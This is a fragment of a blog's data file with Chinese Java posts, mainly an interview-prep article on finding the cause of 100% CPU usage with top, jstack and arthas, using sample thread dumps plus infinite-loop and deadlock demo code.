使用JVM参数优化</h3><p><strong>场景</strong>：JVM启动参数未优化。</p>\n<p><strong>调优</strong>：使用合适的JVM参数提高启动速度。</p>\n<p><strong>示例</strong>：在启动命令中添加：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -Xmx256m -Xms256m -XX:TieredStopAtLevel=1 -jar myapp.jar  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"9-优化健康检查机制\"><a href=\"#9-优化健康检查机制\" class=\"headerlink\" title=\"9. 优化健康检查机制\"></a>9. 优化健康检查机制</h3><p><strong>场景</strong>：健康检查逻辑过于复杂。</p>\n<p><strong>调优</strong>：简化或异步执行健康检查逻辑。</p>\n<p><strong>示例</strong>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">@Component  </span><br><span class=\"line\">public class MyHealthIndicator implements HealthIndicator &#123;  </span><br><span class=\"line\">    @Override  </span><br><span class=\"line\">    public Health health() &#123;  </span><br><span class=\"line\">        // 简化健康检查逻辑  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"10-减少Spring-Cloud-Gateway路由\"><a href=\"#10-减少Spring-Cloud-Gateway路由\" class=\"headerlink\" title=\"10. 减少Spring Cloud Gateway路由\"></a>10. 减少Spring Cloud Gateway路由</h3><p><strong>场景</strong>：Spring Cloud Gateway路由数量过多。</p>\n<p><strong>调优</strong>：精简路由配置。</p>\n<p><strong>示例</strong>：在<code>application.yaml</code>中配置：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">spring:  </span><br><span class=\"line\">  cloud:  </span><br><span class=\"line\">    gateway:  </span><br><span class=\"line\">      routes:  </span><br><span class=\"line\">        - id: myroute  </span><br><span class=\"line\">          uri: lb://myservice  </span><br><span class=\"line\">          predicates:  </span><br><span class=\"line\">            - Path=/myapi/**  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>以上是一些常见的Spring Cloud应用启动优化场景。请注意，这些优化措施需要根据实际应用的具体情况来调整。启动优化通常是一个权衡过程，需要在启动速度和应用性能之间找到平衡点。</p>\n"},{"title":"CPU打满怎么处理","date":"2024-06-16T13:11:17.000Z","_content":"\n\n1.cpu占用很高的3大类型，9大场景:\n--------------------\n\nCPU 飙升是一个常见的问题。\n\n在生产环境中，会出现由代码问题导致CPU占用很高，该如何诊断出是哪行java代码导致? 是大家的一项重要基本功，也是大家面试中的家常骗饭。\n\n如果连CPU 飙升的问题都回答不清楚， 都支支吾吾， 面试就很难通过了\n\n下面，用20多年的技术内功洪荒之力，给大家梳理一下 cpu占用很高的三大类型问题，9大问题场景。\n\n![](./2024/06/16/CPU打满怎么处理/1.png)\n### 第1大类型导致CPU100%的问题： 业务类问题\n\n![](./2024/06/16/CPU打满怎么处理/2.png)\n#### 1.1 死循环\n\n> while(true)条件\n\n导致 CPU 占用率高的最简单但最具破坏性的编程错误之一就是死循环。\n\n当程序中的循环缺乏正确的退出条件或条件从未满足时，就会出现这种情况，\n\n死循环无休止地运行，消耗过多的处理器时间，导致CPU100%\n\n#### 1.2 死锁\n\n发生死锁后，就会存在忙等待或自旋锁等编程问题，从而导致 繁忙等待问题。\n\n即进程在不释放 CPU 的情况下反复检查条件是否满足，会导致 CPU 占用率居高不下。\n\n这种低效率的资源使用会妨碍 CPU 执行其他任务。\n\n#### 1.3 不必要的代码块\n\n在不需要的地方使用`synchronized`块，会导致线程竞争和上下文切换\n\n解决方案:尽量减少同步块的使用范围\n\n### 第2大类型导致CPU100%的问题：并发类问题\n\n![](./2024/06/16/CPU打满怎么处理/3.png)\n#### 1.4 大量计算密集型的任务\n\n比如复杂的数学计算，图像处理，视频编码\n\n计算密集型的任务需要大量的计算能力。在没有足够系统资源的情况下运行这些应用程序，可能会导致 CPU 占用率达到 100%，因为它们试图执行高要求的任务。\n\n解决方案:优化算法，使用更高效的库，或者利用并行计算来分摊\n\n#### 1.5 大量并发线程\n\n多个线程同时运行会导致对 CPU 资源的竞争，尤其是当其中许多线程都是资源密集型进程时。\n\n这会导致所有线程获得的 CPU 时间减少，当每个线程都试图完成自己的任务时，CPU 时间可能会被耗尽。\n\n#### 1.6 大量的上下文切换\n\n创建过多的线程，导致频繁的上下文切换\n\n解决方案:使用线程池来管理线程的数量\n\n### 第3大类导致CPU100%的问题：内存类问题\n\n![](./2024/06/16/CPU打满怎么处理/4.png)\n#### 1.7 内存不足\n\n当系统内存不足时，就会将磁盘存储作为虚拟内存使用，而虚拟内存的运行速度要慢得多。\n\n这种**过度的分页和交换**会导致 CPU 占用率居高不下，因为处理器需要花费更多时间来管理内存访问，而不是高效地执行进程。\n\n#### 1.8 频繁GC\n\n创建大量的短生命周期的对象，频繁触发GC\n\n解决方案: 优化代码， 减少对象的创建 ，或者调整JVM的参数来优化\n\n#### 1.9 内存泄漏\n\n程序持续分配内存但不释放，会导致频繁的GC\n\n解决方案:使用内存分析工具VisualVM进行检测和修复\n\n2.CPU100%定位的两大神器:\n-----------------\n\n想要定位到具体是哪一行的代码导致， 一般都会使用下面的两大神器\n\n*   通常使用的jvm自带的工具jstack，\n\n*   还有一种就是开源神器arthas，\n\n\n一般而言，arthas还有其它的功能，所以选择它多一点.\n\n![](./2024/06/16/CPU打满怎么处理/5.png)\n在后面的讲解中，\n\n会首先讲解jstack， 使用jstack来解决实际遇到的问题，\n\n然后在使用第二大神器 arthas来解决相同的问题，\n\n大家可以在这两个工具使用过程中选择自己比较顺手的， 这里推荐 arthas， 关于arthas的细致学习，请参考的《arthas 学习圣经》 PDF。\n\n> 此面试题的配套视频，请参见《Java面试宝典核心面试题》第二季。\n\n3 CPU 飙升100%的解决思路与方法论\n---------------------\n\n![](./2024/06/16/CPU打满怎么处理/6.png)\n4 使用jstack 解决CPU 100%问题实操\n-------------------------\n\n使用jstack 解决CPU 100%问题，在方法论上要用到两个命令，\n\n*   top 命令查看TOP N线程，\n\n*   jstack命令查看堆栈信息\n\n\n![](./2024/06/16/CPU打满怎么处理/7.png)\n> 此面试题的配套视频，请参见《Java面试宝典核心面试题》第二季。\n\n### 4.1.jstack命令讲解\n\n命令jstack是java堆栈的跟踪工具，可以打印出程序中所有线程的堆栈信息，包括线程状态，调用栈信息，锁信息等。\n\njstack可以诊断线程死锁、内存泄漏等问题\n\n命令格式: jstack \\[options\\] pid\n\n> 常用例子: jstack -l pid，查看线程的堆栈信息\n\n堆栈信息解读:\n\n```\n\n\nyupengdembp:TestYupeng yupeng$ jstack -l 43953  \n2024\\-06\\-08 10:14:45  \nFull thread dump Java HotSpot(TM) 64-Bit Server VM (25.191\\-b12 mixed mode):  \n  \n\"Attach Listener\" #10 daemon prio=9 os\\_prio=31 tid=0x00007fb54485a000 nid=0x3503 waiting on condition \\[0x0000000000000000\\]  \n   java.lang.Thread.State: RUNNABLE  \n  \n   Locked ownable synchronizers:  \n        - None  \n  \n\"Service Thread\" #9 daemon prio=9 os\\_prio=31 tid=0x00007fb5430b4000 nid=0x3203 runnable \\[0x0000000000000000\\]  \n   java.lang.Thread.State: RUNNABLE  \n  \n   Locked ownable synchronizers:  \n        - None  \n  \n\"C1 CompilerThread2\" #8 daemon prio=9 os\\_prio=31 tid=0x00007fb54407e800 nid=0x3103 runnable \\[0x0000000000000000\\]  \n   java.lang.Thread.State: RUNNABLE  \n  \n   Locked ownable synchronizers:  \n        - None  \n  \n\"C2 CompilerThread1\" #7 daemon prio=9 os\\_prio=31 tid=0x00007fb54400f800 nid=0x4203 runnable \\[0x0000000000000000\\]  \n   java.lang.Thread.State: RUNNABLE  \n  \n   Locked ownable synchronizers:  \n        - None  \n  \n\"C2 CompilerThread0\" #6 daemon prio=9 os\\_prio=31 tid=0x00007fb54285a000 nid=0x4403 waiting on condition \\[0x0000000000000000\\]  \n   java.lang.Thread.State: RUNNABLE  \n  \n   Locked ownable synchronizers:  \n        - None  \n  \n\"Monitor Ctrl-Break\" #5 daemon prio=5 os\\_prio=31 tid=0x00007fb5430ab000 nid=0x4503 runnable \\[0x0000700002427000\\]  \n   java.lang.Thread.State: RUNNABLE  \n        at java.net.SocketInputStream.socketRead0(Native Method)  \n        at java.net.SocketInputStream.socketRead(SocketInputStream.java:116)  \n        at java.net.SocketInputStream.read(SocketInputStream.java:171)  \n        at java.net.SocketInputStream.read(SocketInputStream.java:141)  \n        at sun.nio.cs.StreamDecoder.readBytes(StreamDecoder.java:284)  \n        at sun.nio.cs.StreamDecoder.implRead(StreamDecoder.java:326)  \n        at sun.nio.cs.StreamDecoder.read(StreamDecoder.java:178)  \n        - locked <0x000000079570b9e0\\> (a java.io.InputStreamReader)  \n        at java.io.InputStreamReader.read(InputStreamReader.java:184)  \n        at java.io.BufferedReader.fill(BufferedReader.java:161)  \n        at java.io.BufferedReader.readLine(BufferedReader.java:324)  \n        - locked <0x000000079570b9e0\\> (a java.io.InputStreamReader)  \n        at java.io.BufferedReader.readLine(BufferedReader.java:389)  \n        at com.intellij.rt.execution.application.AppMainV2$1.run(AppMainV2.java:47)  \n  \n   Locked ownable synchronizers:  \n        - None  \n  \n\"Signal Dispatcher\" #4 daemon prio=9 os\\_prio=31 tid=0x00007fb544026000 nid=0x4603 runnable \\[0x0000000000000000\\]  \n   java.lang.Thread.State: RUNNABLE  \n  \n   Locked ownable synchronizers:  \n        - None  \n  \n\"Finalizer\" #3 daemon prio=8 os\\_prio=31 tid=0x00007fb544817000 nid=0x5103 in Object.wait() \\[0x0000700002098000\\]  \n   java.lang.Thread.State: WAITING (on object monitor)  \n        at java.lang.Object.wait(Native Method)  \n        - waiting on <0x0000000795588ed0\\> (a java.lang.ref.ReferenceQueue$Lock)  \n        at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:144)  \n        - locked <0x0000000795588ed0\\> (a java.lang.ref.ReferenceQueue$Lock)  \n        at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:165)  \n        at java.lang.ref.Finalizer$FinalizerThread.run(Finalizer.java:216)  \n  \n   Locked ownable synchronizers:  \n        - None  \n  \n\"Reference Handler\" #2 daemon prio=10 os\\_prio=31 tid=0x00007fb54303f800 nid=0x2c03 in Object.wait() \\[0x0000700001f95000\\]  \n   java.lang.Thread.State: WAITING (on object monitor)  \n        at java.lang.Object.wait(Native Method)  \n        - waiting on <0x0000000795586bf8\\> (a java.lang.ref.Reference$Lock)  \n        at java.lang.Object.wait(Object.java:502)  \n        at java.lang.ref.Reference.tryHandlePending(Reference.java:191)  \n        - locked <0x0000000795586bf8\\> (a java.lang.ref.Reference$Lock)  \n        at java.lang.ref.Reference$ReferenceHandler.run(Reference.java:153)  \n  \n   Locked ownable synchronizers:  \n        - None  \n  \n\"main\" #1 prio=5 os\\_prio=31 tid=0x00007fb54280e000 nid=0xe03 waiting on condition \\[0x0000700001983000\\]  \n   java.lang.Thread.State: TIMED\\_WAITING (sleeping)  \n        at java.lang.Thread.sleep(Native Method)  \n        at com.jvm.JVMtest.main(JVMtest.java:6)  \n  \n   Locked ownable synchronizers:  \n        - None  \n  \n\"VM Thread\" os\\_prio=31 tid=0x00007fb544816800 nid=0x5303 runnable   \n  \n\"GC task thread#0 (ParallelGC)\" os\\_prio=31 tid=0x00007fb544009800 nid=0x2507 runnable   \n  \n\"GC task thread#1 (ParallelGC)\" os\\_prio=31 tid=0x00007fb54300f800 nid=0x2403 runnable   \n  \n\"GC task thread#2 (ParallelGC)\" os\\_prio=31 tid=0x00007fb543010000 nid=0x2303 runnable   \n  \n\"GC task thread#3 (ParallelGC)\" os\\_prio=31 tid=0x00007fb543010800 nid=0x2a03 runnable   \n  \n\"VM Periodic Task Thread\" os\\_prio=31 tid=0x00007fb5430b4800 nid=0x3f03 waiting on condition   \n  \nJNI global references: 15  \n  \n\n\n\n```\n\n你会发现上面的信息其实是一段一段的，摘取其中的一段为大家说明:\n\n```\n\n\n\"main\" #1 prio=5 os\\_prio=31 tid=0x00007fb54280e000 nid=0xe03 waiting on condition \\[0x0000700001983000\\]  \n   java.lang.Thread.State: TIMED\\_WAITING (sleeping)  \n        at java.lang.Thread.sleep(Native Method)  \n        at com.jvm.JVMtest.main(JVMtest.java:6)  \n\n\n\n```\n\n`main`:线程名称\n\n`#1`:当前线程ID，从main开始，jvm会根据线程创建的顺序为其线程编号\n\n`prio`:优先级的顺序，一般默认是5\n\n`os_prio`:线程对应系统的优先级\n\n`tid`:java内的线程id\n\n`nid`:操作系统级别的线程id，是一个十六进制\n\n关于线程的信息:\n\n`NEW`:线程新建，还没开始运行\n\n`RUNNABLE`:正在java虚拟机中运行的线程\n\n`BLOCKED` :被阻塞，正在等待监视器锁的线程\n\n`WAITING` :无限期等待另一个线程执行特定操作的线程\n\n`TIMED_WAITING`:等待另一个线程执行操作达到指定等待时间的线程\n\n`TERMINATED`:已经退出的线程\n\n我们这里关注的最多的就是`nid`\n\n### 4.2.使用jstack解决CPU占用很高的问题并定位具体行数\n\n先来看一段代码:\n\n```\n\n\npackage com.jvm;  \n  \nimport java.util.concurrent.ExecutorService;  \nimport java.util.concurrent.Executors;  \n  \npublic class JVMCPU {  \n    private static ExecutorService service = Executors.newFixedThreadPool(5);  \n    private static Object lock = new Object();  \n    public static class yupengTask implements Runnable{  \n  \n        @Override  \n        public void run() {  \n            synchronized (lock){  \n                long sum = 0L;  \n                while(true){  \n                    sum +=1;  \n                }  \n            }  \n        }  \n    }  \n    public static void main(String\\[\\] args) {  \n  \n        yupengTask yupengTask = new yupengTask();  \n        service.execute(yupengTask);  \n  \n    }  \n}  \n  \n\n\n\n```\n\n将这段代码上传到linux服务器，并且使用`nohup java JVMCPU &`运行\n\n![](./2024/06/16/CPU打满怎么处理/8.png)\n使用`top`命令可以看到cpu被打满了\n\n![](./2024/06/16/CPU打满怎么处理/9.png)\n知道了进程的PID，如何找到进程下是哪个线程呢?可以使用命令`top -Hp 26964`，如下所示\n\n![](./2024/06/16/CPU打满怎么处理/10.png)\n从上面的图可以看到，cpu占用最多的线程是26976这个线程id，接下来就是使用`jstack`命令来查看程序的所有堆栈信息，但是，这里需要有一个注意的点，26876这个是一个十进制\n\n的，使用jstack看到的nid是十六进制，所以我们需要转换，可以使用`printf \"%x\\n\"`这个命令\n\n![](./2024/06/16/CPU打满怎么处理/11.png)\n接下来使用`jstack -l 26964`打印堆栈信息\n\n```\n\n\n2024\\-06\\-08 12:17:36  \nFull thread dump Java HotSpot(TM) 64-Bit Server VM (25.281\\-b09 mixed mode):  \n  \n\"Attach Listener\" #10 daemon prio=9 os\\_prio=0 tid=0x00007f006c001000 nid=0xc7f waiting on condition \\[0x0000000000000000\\]  \n   java.lang.Thread.State: RUNNABLE  \n  \n   Locked ownable synchronizers:  \n\t- None  \n  \n\"DestroyJavaVM\" #9 prio=5 os\\_prio=0 tid=0x00007f00a0009800 nid=0x6955 waiting on condition \\[0x0000000000000000\\]  \n   java.lang.Thread.State: RUNNABLE  \n  \n   Locked ownable synchronizers:  \n\t- None  \n  \n\"pool-1-thread-1\" #8 prio=5 os\\_prio=0 tid=0x00007f00a00f0000 nid=0x6960 runnable \\[0x00007f008b0ef000\\]  \n   java.lang.Thread.State: RUNNABLE  \n\tat JVMCPU$yupengTask.run(JVMCPU.java:14)  \n\t- locked <0x00000000f59dfcf0\\> (a java.lang.Object)  \n\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)  \n\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)  \n\tat java.lang.Thread.run(Thread.java:748)  \n  \n   Locked ownable synchronizers:  \n\t- <0x00000000f59e0ed0\\> (a java.util.concurrent.ThreadPoolExecutor$Worker)  \n  \n\"Service Thread\" #7 daemon prio=9 os\\_prio=0 tid=0x00007f00a00d4800 nid=0x695e runnable \\[0x0000000000000000\\]  \n   java.lang.Thread.State: RUNNABLE  \n  \n   Locked ownable synchronizers:  \n\t- None  \n  \n\"C1 CompilerThread1\" #6 daemon prio=9 os\\_prio=0 tid=0x00007f00a00b9800 nid=0x695d waiting on condition \\[0x0000000000000000\\]  \n   java.lang.Thread.State: RUNNABLE  \n  \n   Locked ownable synchronizers:  \n\t- None  \n  \n\"C2 CompilerThread0\" #5 daemon prio=9 os\\_prio=0 tid=0x00007f00a00b6800 nid=0x695c waiting on condition \\[0x0000000000000000\\]  \n   java.lang.Thread.State: RUNNABLE  \n  \n   Locked ownable synchronizers:  \n\t- None  \n  \n\"Signal Dispatcher\" #4 daemon prio=9 os\\_prio=0 tid=0x00007f00a00b5000 nid=0x695b runnable \\[0x0000000000000000\\]  \n   java.lang.Thread.State: RUNNABLE  \n  \n   Locked ownable synchronizers:  \n\t- None  \n  \n\"Finalizer\" #3 daemon prio=8 os\\_prio=0 tid=0x00007f00a0082000 nid=0x695a in Object.wait() \\[0x00007f008b6f5000\\]  \n   java.lang.Thread.State: WAITING (on object monitor)  \n\tat java.lang.Object.wait(Native Method)  \n\t- waiting on <0x00000000f5988ee0\\> (a java.lang.ref.ReferenceQueue$Lock)  \n\tat java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:144)  \n\t- locked <0x00000000f5988ee0\\> (a java.lang.ref.ReferenceQueue$Lock)  \n\tat java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:165)  \n\tat java.lang.ref.Finalizer$FinalizerThread.run(Finalizer.java:216)  \n  \n   Locked ownable synchronizers:  \n\t- None  \n  \n\"Reference Handler\" #2 daemon prio=10 os\\_prio=0 tid=0x00007f00a007d800 nid=0x6959 in Object.wait() \\[0x00007f008b7f6000\\]  \n   java.lang.Thread.State: WAITING (on object monitor)  \n\tat java.lang.Object.wait(Native Method)  \n\t- waiting on <0x00000000f5986c00\\> (a java.lang.ref.Reference$Lock)  \n\tat java.lang.Object.wait(Object.java:502)  \n\tat java.lang.ref.Reference.tryHandlePending(Reference.java:191)  \n\t- locked <0x00000000f5986c00\\> (a java.lang.ref.Reference$Lock)  \n\tat java.lang.ref.Reference$ReferenceHandler.run(Reference.java:153)  \n  \n   Locked ownable synchronizers:  \n\t- None  \n  \n\"VM Thread\" os\\_prio=0 tid=0x00007f00a0074000 nid=0x6958 runnable   \n  \n\"GC task thread#0 (ParallelGC)\" os\\_prio=0 tid=0x00007f00a001e800 nid=0x6956 runnable   \n  \n\"GC task thread#1 (ParallelGC)\" os\\_prio=0 tid=0x00007f00a0020800 nid=0x6957 runnable   \n  \n\"VM Periodic Task Thread\" os\\_prio=0 tid=0x00007f00a00d7800 nid=0x695f waiting on condition   \n  \nJNI global references: 5  \n  \n  \n\n\n\n```\n\n从上面的信息中，可以看到转换的结果和nid是一致的，\n\n从下面的信息中就可以看到问题其实是出现在`JVMCPU.java`的14行左右，这里给出的是14行，但是实际情况是14行的附近\n\n```\n\n\n\"pool-1-thread-1\" #8 prio=5 os\\_prio=0 tid=0x00007f00a00f0000 nid=0x6960 runnable \\[0x00007f008b0ef000\\]  \n   java.lang.Thread.State: RUNNABLE  \n\tat JVMCPU$yupengTask.run(JVMCPU.java:14)  \n\t- locked <0x00000000f59dfcf0\\> (a java.lang.Object)  \n\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)  \n\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)  \n\tat java.lang.Thread.run(Thread.java:748)  \n\n\n\n```\n\n结合代码来看一下就很容易问题\n\n![](./2024/06/16/CPU打满怎么处理/12.png)\n> 此面试题的配套视频，请参见《Java面试宝典核心面试题》第二季。\n\n5.使用arthas解决CPU占用很高的问题，定位具体代码行\n------------------------------\n\n使用arthas解决CPU 100%问题，在方法论上要用到两个命令，\n\n*   dashboard 命令查看TOP N线程，\n\n*   thread 命令查看堆栈信息\n\n\n![](./2024/06/16/CPU打满怎么处理/13.png)\n先来运行`arthas`\n\n![](./2024/06/16/CPU打满怎么处理/14.png)\n输入1显示如下\n\n![](./2024/06/16/CPU打满怎么处理/15.png)\n输入`dashboard`命令可以看到是哪个线程占用cpu最高\n\n![](./2024/06/16/CPU打满怎么处理/16.png)\n接下来输入`thread -n 3`，表示最忙的前3个线程并打印信息\n\n![](./2024/06/16/CPU打满怎么处理/17.png)\n从上面的图中可以看到arthas和jstack展示的信息差不多，都定位到了`JVMCPU.java`的14行程序\n\n6.死锁导致CPU占用很高的问题分析\n------------------\n\n先来看一段代码:\n\n```\n\n\npublic class DeadlockDemo {  \n  \n    // 创建两个锁对象  \n    private static final Object lock1 = new Object();  \n    private static final Object lock2 = new Object();  \n  \n    public static void main(String\\[\\] args) {  \n  \n        // 线程1尝试获取lock1，然后获取lock2  \n        Thread thread1 = new Thread(() -> {  \n            synchronized (lock1) {  \n                System.out.println(\"Thread 1: Holding lock 1...\");  \n  \n                try { Thread.sleep(100); }   \n                catch (InterruptedException e) {}  \n  \n                System.out.println(\"Thread 1: Waiting for lock 2...\");  \n  \n                synchronized (lock2) {  \n                    System.out.println(\"Thread 1: Holding lock 1 & 2...\");  \n                }  \n            }  \n        });  \n  \n        // 线程2尝试获取lock2，然后获取lock1  \n        Thread thread2 = new Thread(() -> {  \n            synchronized (lock2) {  \n                System.out.println(\"Thread 2: Holding lock 2...\");  \n  \n                try { Thread.sleep(100); }   \n                catch (InterruptedException e) {}  \n  \n                System.out.println(\"Thread 2: Waiting for lock 1...\");  \n  \n                synchronized (lock1) {  \n                    System.out.println(\"Thread 2: Holding lock 2 & 1...\");  \n                }  \n            }  \n        });  \n  \n        thread1.start();  \n        thread2.start();  \n    }  \n}  \n\n\n\n```\n\n将上面的代码上传到服务器，使用`nohuo java DeadlockDemo &`运行起来\n\n![](./2024/06/16/CPU打满怎么处理/18.png)\n接下来使用arthas进行分析\n\n> 这里选择arthas，不选择jstack是因为arthas更加的方便，它的功能也比jstack丰富\n\n输入thread就可以输出线程的统计信息，其中BLOCKED代表当前阻塞的线程数\n\n![](./2024/06/16/CPU打满怎么处理/19.png)\n接下来，输入`thread -b`就可以看到线程具体的情况，在下面的图中已经准确的说明了代码在哪一行\n\n![](./2024/06/16/CPU打满怎么处理/20.png)\n> 此面试题的配套视频，请参见《Java面试宝典核心面试题》第二季。\n\n7.小提示\n-----\n\n工具的选择建议使用arthas，它还有很多的功能在实际中很有用\n\n大家在面试的时候如果遇到cpu被打满该如何排查这样的问题，不要上来就是使用arthas来定位问题，我们的第一反应永远都是回滚版本，\n\n因为在实际中代码的问题需要分析，不会像举例子这么简单，代码经过分析改动再上线，会浪费很多时间，而有的业务是绝对不允许这么操作的，比如电商，金融的业务，\n\n所以在回答面试官的问题时候一定要先说回滚，在说解决办法.\n\n\n","source":"_posts/CPU打满怎么处理.md","raw":"---\ntitle: CPU打满怎么处理\ndate: 2024-06-16 21:11:17\ntags: CPU打满\ncategories: 面试\n---\n\n\n1.cpu占用很高的3大类型，9大场景:\n--------------------\n\nCPU 飙升是一个常见的问题。\n\n在生产环境中，会出现由代码问题导致CPU占用很高，该如何诊断出是哪行java代码导致? 是大家的一项重要基本功，也是大家面试中的家常骗饭。\n\n如果连CPU 飙升的问题都回答不清楚， 都支支吾吾， 面试就很难通过了\n\n下面，用20多年的技术内功洪荒之力，给大家梳理一下 cpu占用很高的三大类型问题，9大问题场景。\n\n![](./2024/06/16/CPU打满怎么处理/1.png)\n### 第1大类型导致CPU100%的问题： 业务类问题\n\n![](./2024/06/16/CPU打满怎么处理/2.png)\n#### 1.1 死循环\n\n> while(true)条件\n\n导致 CPU 占用率高的最简单但最具破坏性的编程错误之一就是死循环。\n\n当程序中的循环缺乏正确的退出条件或条件从未满足时，就会出现这种情况，\n\n死循环无休止地运行，消耗过多的处理器时间，导致CPU100%\n\n#### 1.2 死锁\n\n发生死锁后，就会存在忙等待或自旋锁等编程问题，从而导致 繁忙等待问题。\n\n即进程在不释放 CPU 的情况下反复检查条件是否满足，会导致 CPU 占用率居高不下。\n\n这种低效率的资源使用会妨碍 CPU 执行其他任务。\n\n#### 1.3 不必要的代码块\n\n在不需要的地方使用`synchronized`块，会导致线程竞争和上下文切换\n\n解决方案:尽量减少同步块的使用范围\n\n### 第2大类型导致CPU100%的问题：并发类问题\n\n![](./2024/06/16/CPU打满怎么处理/3.png)\n#### 1.4 大量计算密集型的任务\n\n比如复杂的数学计算，图像处理，视频编码\n\n计算密集型的任务需要大量的计算能力。在没有足够系统资源的情况下运行这些应用程序，可能会导致 CPU 占用率达到 100%，因为它们试图执行高要求的任务。\n\n解决方案:优化算法，使用更高效的库，或者利用并行计算来分摊\n\n#### 1.5 大量并发线程\n\n多个线程同时运行会导致对 CPU 资源的竞争，尤其是当其中许多线程都是资源密集型进程时。\n\n这会导致所有线程获得的 CPU 时间减少，当每个线程都试图完成自己的任务时，CPU 时间可能会被耗尽。\n\n#### 1.6 大量的上下文切换\n\n创建过多的线程，导致频繁的上下文切换\n\n解决方案:使用线程池来管理线程的数量\n\n### 第3大类导致CPU100%的问题：内存类问题\n\n![](./2024/06/16/CPU打满怎么处理/4.png)\n#### 1.7 内存不足\n\n当系统内存不足时，就会将磁盘存储作为虚拟内存使用，而虚拟内存的运行速度要慢得多。\n\n这种**过度的分页和交换**会导致 CPU 占用率居高不下，因为处理器需要花费更多时间来管理内存访问，而不是高效地执行进程。\n\n#### 1.8 频繁GC\n\n创建大量的短生命周期的对象，频繁触发GC\n\n解决方案: 优化代码， 减少对象的创建 ，或者调整JVM的参数来优化\n\n#### 1.9 内存泄漏\n\n程序持续分配内存但不释放，会导致频繁的GC\n\n解决方案:使用内存分析工具VisualVM进行检测和修复\n\n2.CPU100%定位的两大神器:\n-----------------\n\n想要定位到具体是哪一行的代码导致， 一般都会使用下面的两大神器\n\n*   通常使用的jvm自带的工具jstack，\n\n*   还有一种就是开源神器arthas，\n\n\n一般而言，arthas还有其它的功能，所以选择它多一点.\n\n![](./2024/06/16/CPU打满怎么处理/5.png)\n在后面的讲解中，\n\n会首先讲解jstack， 使用jstack来解决实际遇到的问题，\n\n然后在使用第二大神器 arthas来解决相同的问题，\n\n大家可以在这两个工具使用过程中选择自己比较顺手的， 这里推荐 arthas， 关于arthas的细致学习，请参考的《arthas 学习圣经》 PDF。\n\n> 此面试题的配套视频，请参见《Java面试宝典核心面试题》第二季。\n\n3 CPU 飙升100%的解决思路与方法论\n---------------------\n\n![](./2024/06/16/CPU打满怎么处理/6.png)\n4 使用jstack 解决CPU 100%问题实操\n-------------------------\n\n使用jstack 解决CPU 100%问题，在方法论上要用到两个命令，\n\n*   top 命令查看TOP N线程，\n\n*   jstack命令查看堆栈信息\n\n\n![](./2024/06/16/CPU打满怎么处理/7.png)\n> 此面试题的配套视频，请参见《Java面试宝典核心面试题》第二季。\n\n### 4.1.jstack命令讲解\n\n命令jstack是java堆栈的跟踪工具，可以打印出程序中所有线程的堆栈信息，包括线程状态，调用栈信息，锁信息等。\n\njstack可以诊断线程死锁、内存泄漏等问题\n\n命令格式: jstack \\[options\\] pid\n\n> 常用例子: jstack -l pid，查看线程的堆栈信息\n\n堆栈信息解读:\n\n```\n\n\nyupengdembp:TestYupeng yupeng$ jstack -l 43953  \n2024\\-06\\-08 10:14:45  \nFull thread dump Java HotSpot(TM) 64-Bit Server VM (25.191\\-b12 mixed mode):  \n  \n\"Attach Listener\" #10 daemon prio=9 os\\_prio=31 tid=0x00007fb54485a000 nid=0x3503 waiting on condition \\[0x0000000000000000\\]  \n   java.lang.Thread.State: RUNNABLE  \n  \n   Locked ownable synchronizers:  \n        - None  \n  \n\"Service Thread\" #9 daemon prio=9 os\\_prio=31 tid=0x00007fb5430b4000 nid=0x3203 runnable \\[0x0000000000000000\\]  \n   java.lang.Thread.State: RUNNABLE  \n  \n   Locked ownable synchronizers:  \n        - None  \n  \n\"C1 CompilerThread2\" #8 daemon prio=9 os\\_prio=31 tid=0x00007fb54407e800 nid=0x3103 runnable \\[0x0000000000000000\\]  \n   java.lang.Thread.State: RUNNABLE  \n  \n   Locked ownable synchronizers:  \n        - None  \n  \n\"C2 CompilerThread1\" #7 daemon prio=9 os\\_prio=31 tid=0x00007fb54400f800 nid=0x4203 runnable \\[0x0000000000000000\\]  \n   java.lang.Thread.State: RUNNABLE  \n  \n   Locked ownable synchronizers:  \n        - None  \n  \n\"C2 CompilerThread0\" #6 daemon prio=9 os\\_prio=31 tid=0x00007fb54285a000 nid=0x4403 waiting on condition \\[0x0000000000000000\\]  \n   java.lang.Thread.State: RUNNABLE  \n  \n   Locked ownable synchronizers:  \n        - None  \n  \n\"Monitor Ctrl-Break\" #5 daemon prio=5 os\\_prio=31 tid=0x00007fb5430ab000 nid=0x4503 runnable \\[0x0000700002427000\\]  \n   java.lang.Thread.State: RUNNABLE  \n        at java.net.SocketInputStream.socketRead0(Native Method)  \n        at java.net.SocketInputStream.socketRead(SocketInputStream.java:116)  \n        at java.net.SocketInputStream.read(SocketInputStream.java:171)  \n        at java.net.SocketInputStream.read(SocketInputStream.java:141)  \n        at sun.nio.cs.StreamDecoder.readBytes(StreamDecoder.java:284)  \n        at sun.nio.cs.StreamDecoder.implRead(StreamDecoder.java:326)  \n        at sun.nio.cs.StreamDecoder.read(StreamDecoder.java:178)  \n        - locked <0x000000079570b9e0\\> (a java.io.InputStreamReader)  \n        at java.io.InputStreamReader.read(InputStreamReader.java:184)  \n        at java.io.BufferedReader.fill(BufferedReader.java:161)  \n        at java.io.BufferedReader.readLine(BufferedReader.java:324)  \n        - locked <0x000000079570b9e0\\> (a java.io.InputStreamReader) 